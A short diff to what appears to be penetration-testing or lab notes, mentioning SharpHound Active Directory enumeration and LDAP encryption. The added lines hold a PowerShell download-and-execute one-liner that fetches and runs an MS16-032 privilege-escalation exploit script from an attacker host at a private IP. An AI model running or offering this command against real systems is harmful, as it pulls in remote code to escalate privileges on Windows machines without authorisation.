@@ -20,3 +20,7 @@ Status: 21300 objects enumerated (+14650 519.5122/s --- Using 90 MB RAM )
 
 
 Above LDAP:389 connection is encrypted by default in SharpHound, according to blog post here: https://github.com/BloodHoundAD/SharpHound/issues/9 by rvazarkar
+
+
+#powershell invocation of MS16-032 (non-interactive version of the exploit):
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-MS16032.ps1')
